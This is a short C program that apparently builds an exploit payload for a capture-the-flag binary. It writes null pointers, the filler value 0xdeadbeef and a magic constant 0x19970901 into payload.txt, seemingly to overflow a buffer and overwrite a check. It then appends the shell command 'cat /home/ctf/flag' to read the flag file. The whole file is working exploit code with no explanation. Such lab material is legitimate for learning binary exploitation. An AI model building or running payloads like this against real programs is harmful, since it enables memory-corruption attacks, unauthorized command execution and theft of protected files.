#include <unistd.h>
#include <fcntl.h>
int main() {
    int a = 0xdeadbeef;
    int b = 0x19970901;
    void* c = 0x0;
    int fd = open("./payload.txt", O_CREAT | O_TRUNC | O_RDWR);

    write(fd, &c, sizeof(c));
    write(fd, &c, sizeof(c));

    write(fd, &a, sizeof(a));

    write(fd, &a, sizeof(a));
    write(fd, &c, sizeof(c));

    write(fd, &b, sizeof(b));
    write(fd, "\n", sizeof("\n"));

    write(fd, "cat /home/ctf/flag\n", sizeof("cat /home/ctf/flag\n"));
    
    close(fd);
    

}